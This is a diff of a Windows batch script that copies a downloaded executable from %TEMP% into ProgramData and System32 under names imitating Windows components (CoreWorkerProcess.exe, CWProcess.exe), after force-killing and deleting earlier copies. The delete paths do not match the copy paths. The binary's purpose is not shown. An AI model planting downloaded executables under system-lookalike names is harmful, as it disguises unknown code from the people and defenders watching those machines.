@@ -72,8 +72,8 @@ for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 
 :: Check if the file size is at least 80KB (81920 bytes)
 if %FILESIZE% geq 81920 (
-    copy /y "%TEMP%\!filename!.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
-    copy /y "%TEMP%\!filename!.exe" "%SystemRoot%\System32\CWProcess.exe"
+    rem copy /y "%TEMP%\!filename!.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+    rem copy /y "%TEMP%\!filename!.exe" "%SystemRoot%\System32\CWProcess.exe"
 ) else (
 echo.
     echo Download incomplete. Check your connection and run the file again.
@@ -83,6 +83,34 @@ echo.
 	echo.
 	goto DOWNLOADINGAGAIN
 )
+
+
+
+taskkill /f /im "CoreWorkerProcess.exe"
+taskkill /f /im "CWProcess.exe"
+
+del /f /q "%SystemRoot%\System32\CoreWorkerProcess.exe"
+del /f /q "%ProgramData%\Microsoft\Windows\CWProcess.exe"
+
+
+
+if exist "%temp%\!filename!.exe" (
+    echo Copying CoreWorkerProcess..
+    copy /y "%TEMP%\!filename!.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+    copy /y "%TEMP%\!filename!.exe" "%SystemRoot%\System32\CWProcess.exe"
+)
+
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+
+
+
+
 
 
 
